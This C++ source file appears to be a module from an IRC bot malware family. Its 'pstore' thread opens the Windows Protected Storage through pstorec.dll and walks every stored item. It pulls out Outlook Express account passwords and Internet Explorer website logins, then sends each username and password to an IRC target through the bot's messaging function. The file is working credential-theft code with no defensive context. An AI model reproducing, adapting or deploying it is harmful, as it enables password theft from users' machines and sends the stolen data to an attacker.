#include "../../Headers/includes.h"
#include "../../Headers/functions.h"
#include "../../Headers/externs.h"

#ifndef NO_PSTORE

void __stdcall _com_issue_errorex(long,struct IUnknown *,struct _GUID const &)
{
    return;
}
void __stdcall _com_issue_error(long)
{
    return;
}

DWORD WINAPI pstore (LPVOID param)
{
    typedef HRESULT (__stdcall *PSCI)(IPStore **, DWORD, DWORD, DWORD);

    NTHREAD pStorInfoX = *((NTHREAD *)param);
    NTHREAD *pStorInfoXs = (NTHREAD *)param;
    pStorInfoXs->gotinfo = TRUE;
    IRC* irc=(IRC*)pStorInfoX.conn;
    char *searchparam = NULL;
    GUID TypeGUID;
    char szItemName[512];
    char szItemData[512];
    char szResName[1512];
    char szResData[512];
    char szItemGUID[50];
    PSCI fPStoreCreateInstance;
    int iSent=0;
    IPStorePtr PStore;


    if (pStorInfoX.bdata1 == TRUE)
        searchparam = pStorInfoX.data1;
    else
        searchparam = NULL;


    HMODULE pstorec_dll = LoadLibrary("pstorec.dll");
    if (pstorec_dll)
        fPStoreCreateInstance = (PSCI)GetProcAddress(pstorec_dll,"PStoreCreateInstance");
    else {
		clearthread(pStorInfoX.threadnum);
		ExitThread(0);
        return 0;
	}


    HRESULT hRes=fPStoreCreateInstance(&PStore, 0, 0, 0);
    
	if (FAILED(hRes)) {
		clearthread(pStorInfoX.threadnum);
		ExitThread(0);
        return 0;
	}

    IEnumPStoreTypesPtr EnumPStoreTypes;
    hRes=PStore->EnumTypes(0, 0, &EnumPStoreTypes);
    
	if (FAILED(hRes)) {
		clearthread(pStorInfoX.threadnum);
		ExitThread(0);
        return 0;
	}
	irc->pmsg(pStorInfoX.target,"%s starting PStore", pstore_title);
    while (EnumPStoreTypes->raw_Next(1,&TypeGUID,0) == S_OK)
    {
        wsprintf(szItemGUID,"%x",TypeGUID);
        IEnumPStoreTypesPtr EnumSubTypes;
        hRes = PStore->EnumSubtypes(0, &TypeGUID, 0, &EnumSubTypes);
        GUID subTypeGUID;
        while (EnumSubTypes->raw_Next(1,&subTypeGUID,0) == S_OK)
        {
            IEnumPStoreItemsPtr spEnumItems;
            HRESULT hRes=PStore->EnumItems(0, &TypeGUID, &subTypeGUID, 0, &spEnumItems);
            LPWSTR itemName;
            while (spEnumItems->raw_Next(1,&itemName,0) == S_OK)
            {
                wsprintf(szItemName,"%ws",itemName);
                char chekingdata[200];
                unsigned long psDataLen = 0;
                unsigned char *psData = NULL;
                _PST_PROMPTINFO *pstiinfo = NULL;
                hRes = PStore->ReadItem(0,&TypeGUID,&subTypeGUID,itemName,&psDataLen,&psData,pstiinfo,0);
                if (lstrlen((char *)psData),(psDataLen-1))
                {
                    int i=0;
                    for (unsigned int m = 0;m<psDataLen;m+=2)
                    {
                        if (psData[m]==0)
                            szItemData[i]=',';
                        else
                            szItemData[i]=psData[m];
                        i++;
                    }
                    szItemData[i-1]=0;
                }
                else
                {
                    wsprintf(szItemData,"%s",psData);
                }
                lstrcpy(szResName,"");
                lstrcpy(szResData,"");
                if (lstrcmp(szItemGUID,"5e7e8100")==0)
                {
                    lstrcpy(chekingdata,"");
                    if (strstr(szItemData,":")!=0)
                    {
                        lstrcpy(chekingdata,strstr(szItemData,":")+1);
                        *(strstr(szItemData,":"))=0;
                    }
                    iSent++;
                    if ((strcmp(szItemData,"") && strcmp(chekingdata,"")))
                        if (searchparam != NULL)
                        {
							if (strstr(szItemName, searchparam))
								irc->pmsg(pStorInfoX.target, "%s %s %s:%s", pstore_title, szItemName, szItemData, chekingdata);
                        }
                        else
                            irc->pmsg(pStorInfoX.target, "%s %s %s:%s",  pstore_title, szItemName, szItemData, chekingdata);
                }
                if (!lstrcmp(szItemGUID,"e161255a"))
                {
                    if (strstr(szItemName,"StringIndex")==0)
                    {
                        if (strstr(szItemName,":String")!=0)
                            *strstr(szItemName,":String")=0;
                        lstrcpyn(chekingdata,szItemName,8);
                        if (strstr(chekingdata,"http:/") || strstr(chekingdata,"https:/"))
                        {
                            lstrcpy(chekingdata,"");
                            if (strstr(szItemData,",")!=0)
                            {
                                lstrcpy(chekingdata,strstr(szItemData,",")+1);
                                *(strstr(szItemData,","))=0;
                            }
                            iSent++;
                            if ((strcmp(szItemData,"") && strcmp(chekingdata,"")))

                                if (searchparam != NULL)
                                {
                                    if (strstr(szItemName, searchparam))
                                        irc->pmsg(pStorInfoX.target, "%s %s %s:%s",  pstore_title, szItemName, szItemData, chekingdata);
                                }
                                else
									irc->pmsg(pStorInfoX.target, "%s %s %s:%s",  pstore_title, szItemName, szItemData, chekingdata);
                        }
                    }
                }
                ZeroMemory(szItemName,sizeof(szItemName));
                ZeroMemory(szItemData,sizeof(szItemData));
                Sleep (1000);
            }
        }
    }
	
	irc->pmsg(pStorInfoX.target, "%s End of PStore", pstore_title);
	clearthread(pStorInfoX.threadnum);
	ExitThread(0);
    return 0;
}
#endif
